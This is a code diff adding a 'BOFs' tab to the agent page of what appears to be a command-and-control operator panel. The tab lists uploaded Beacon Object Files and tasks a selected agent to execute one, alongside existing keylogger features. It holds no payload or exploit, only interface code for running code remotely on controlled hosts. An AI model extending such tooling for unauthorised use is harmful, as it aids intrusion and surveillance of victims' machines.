@@ -76,6 +76,15 @@ const Agent = () => {
   const [fileToUpload, setFileToUpload] = useState(null);
   const [uploadError, setUploadError] = useState(null);
   const fileInputRef = useRef(null);
+  
+  // States related to BOFs tab
+  const [bofs, setBofs] = useState([]);
+  const [selectedBofUuid, setSelectedBofUuid] = useState('');
+  const [bofFunctionName, setBofFunctionName] = useState('go');
+  const [bofPayload, setBofPayload] = useState('');
+  const [taskCreated, setTaskCreated] = useState(false);
+  const [taskError, setTaskError] = useState(null);
+  const bofInputRef = useRef(null);
   const agentCapabilities = Array.isArray(data?.capabilities) ? data.capabilities : [];
   const hasKeylogger = agentCapabilities.includes('keylogger');
 
@@ -189,6 +198,20 @@ const Agent = () => {
       setKeylogTotal(0);
     }
   };
+
+  const fetchBOFs = async () => {
+    try {
+      const response = await axios.get('/api/bofs');
+      if (Array.isArray(response.data)) {
+        setBofs(response.data);
+      } else {
+        setBofs([]);
+      }
+    } catch (err) {
+      console.error('Failed to fetch BOFs:', err);
+      setBofs([]);
+    }
+  };
   
   const handleDownloadFile = async (fileId) => {
     try {
@@ -244,6 +267,43 @@ const Agent = () => {
     }
     setFileUploadPath('');
     setFileToUpload(null);
+  };
+
+  const createBOFTask = async () => {
+    try {
+      if (!selectedBofUuid) {
+        setTaskError('Please select a BOF');
+        return;
+      }
+
+      setTaskCreated(true);
+      setTaskError(null);
+
+      const response = await axios.post('/api/bofs/task', {
+        agent_uuid: getQueryParam('agt'),
+        bof_uuid: selectedBofUuid,
+        function_name: bofFunctionName
+      });
+
+      if (response.data.success) {
+        setTaskCreated(false);
+        setTaskError(null);
+        setBofPayload('');
+        // Refresh commands to show the new task
+        const agentResponse = await axios.get(`/api/agent/${getQueryParam('agt')}`);
+        const commandsResponse = await axios.get(`/api/commands/${getQueryParam('agt')}`);
+        if (Array.isArray(commandsResponse.data)) {
+          setCommands(commandsResponse.data);
+        }
+      } else {
+        setTaskError(response.data.error || 'Failed to create task');
+        setTaskCreated(false);
+      }
+    } catch (err) {
+      console.error('Failed to create BOF task:', err);
+      setTaskError(err.response?.data?.error || 'Failed to create task');
+      setTaskCreated(false);
+    }
   };
   
 
@@ -503,6 +563,123 @@ const Agent = () => {
           <button type="submit">Request Transfer</button>
         </form>
         {uploadError && <p className="error">{uploadError}</p>}
+      </div>
+    );
+  };
+
+  const renderBOFTab = () => {
+    return (
+      <div>
+        <h2>Execute BOF</h2>
+        
+        {taskCreated && (
+          <div style={{ padding: '10px', backgroundColor: '#d4edda', border: '1px solid #c3e6cb', borderRadius: '6px', marginBottom: '15px' }}>
+            ✓ Task created successfully!
+          </div>
+        )}
+        
+        {taskError && (
+          <div style={{ padding: '10px', backgroundColor: '#f8d7da', border: '1px solid #f5c6cb', borderRadius: '6px', marginBottom: '15px' }}>
+            ✗ {taskError}
+          </div>
+        )}
+
+        <div style={{ marginBottom: '20px' }}>
+          <h3>Available BOFs</h3>
+          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+            <thead>
+              <tr style={{ backgroundColor: '#333', color: '#fff' }}>
+                <th style={{ padding: '10px', textAlign: 'left', borderBottom: '2px solid #555' }}>UUID</th>
+                <th style={{ padding: '10px', textAlign: 'left', borderBottom: '2px solid #555' }}>Platform</th>
+                <th style={{ padding: '10px', textAlign: 'left', borderBottom: '2px solid #555' }}>Function Name</th>
+                <th style={{ padding: '10px', textAlign: 'left', borderBottom: '2px solid #555' }}>Description</th>
+                <th style={{ padding: '10px', textAlign: 'left', borderBottom: '2px solid #555' }}>Uploaded</th>
+                <th style={{ padding: '10px', textAlign: 'center', borderBottom: '2px solid #555' }}>Action</th>
+              </tr>
+            </thead>
+            <tbody>
+              {bofs.length === 0 ? (
+                <tr>
+                  <td colSpan="6" style={{ padding: '20px', textAlign: 'center', color: '#888' }}>
+                    No BOFs found. Please upload a BOF first.
+                  </td>
+                </tr>
+              ) : (
+                bofs.map((bof) => (
+                  <tr key={bof.file_id} style={{ borderBottom: '1px solid #444' }}>
+                    <td style={{ padding: '10px', borderBottom: '1px solid #444' }}>{bof.uuid}</td>
+                    <td style={{ padding: '10px', borderBottom: '1px solid #444' }}>
+                      {bof.platform === 'windows' ? '🪟 Windows' : '🐧 Linux'}
+                    </td>
+                    <td style={{ padding: '10px', borderBottom: '1px solid #444' }}>{bof.function_name}</td>
+                    <td style={{ padding: '10px', borderBottom: '1px solid #444' }}>{bof.description || '-'}</td>
+                    <td style={{ padding: '10px', borderBottom: '1px solid #444' }}>
+                      {new Date(bof.uploaded_at).toLocaleString()}
+                    </td>
+                    <td style={{ padding: '10px', borderBottom: '1px solid #444', textAlign: 'center' }}>
+                      <button
+                        onClick={() => setSelectedBofUuid(bof.uuid)}
+                        style={{
+                          background: selectedBofUuid === bof.uuid ? '#28a745' : '#007bff',
+                          color: '#fff',
+                          border: 'none',
+                          padding: '6px 12px',
+                          borderRadius: '4px',
+                          cursor: 'pointer',
+                          fontSize: '12px'
+                        }}
+                      >
+                        {selectedBofUuid === bof.uuid ? 'Selected' : 'Select'}
+                      </button>
+                    </td>
+                  </tr>
+                ))
+              )}
+            </tbody>
+          </table>
+        </div>
+
+        <div style={{ marginTop: '20px', padding: '15px', backgroundColor: '#2d2d2d', borderRadius: '8px' }}>
+          <h3>Create Task</h3>
+          <p style={{ color: '#888', marginBottom: '15px' }}>Execute the selected BOF on this agent</p>
+
+          <div style={{ marginBottom: '15px' }}>
+            <label style={{ display: 'block', marginBottom: '5px', fontWeight: 'bold' }}>Function Name:</label>
+            <input
+              type="text"
+              value={bofFunctionName}
+              onChange={(e) => setBofFunctionName(e.target.value)}
+              placeholder="go (default)"
+              style={{
+                width: '100%',
+                padding: '10px',
+                backgroundColor: '#1a1a1a',
+                border: '1px solid #444',
+                color: '#fff',
+                borderRadius: '4px',
+                boxSizing: 'border-box'
+              }}
+            />
+          </div>
+
+          <button
+            onClick={createBOFTask}
+            disabled={!selectedBofUuid}
+            style={{
+              width: '100%',
+              padding: '12px',
+              backgroundColor: selectedBofUuid ? '#28a745' : '#6c757d',
+              color: '#fff',
+              border: 'none',
+              borderRadius: '6px',
+              cursor: selectedBofUuid ? 'pointer' : 'not-allowed',
+              fontSize: '16px',
+              fontWeight: 'bold'
+            }}
+          >
+            Execute BOF on Agent
+          </button>
+        </div>
       </div>
     );
   };
@@ -792,6 +969,15 @@ const Agent = () => {
                 >
                     Tags
                 </button>
+                <button
+                    className={activeTab === 'bofs' ? 'active' : ''}
+                    onClick={() => {
+                        setActiveTab('bofs');
+                        fetchBOFs();
+                    }}
+                >
+                    BOFs
+                </button>
             </div>
   
             <div className="tab-content">
@@ -801,6 +987,7 @@ const Agent = () => {
                 {activeTab === 'configuration' && renderConfigurationTab()}
                 {activeTab === 'notes' && renderNotesTab()}
                 {activeTab === 'tags' && renderTagsTab()}
+                {activeTab === 'bofs' && renderBOFTab()}
             </div>
         </div>
     </div>
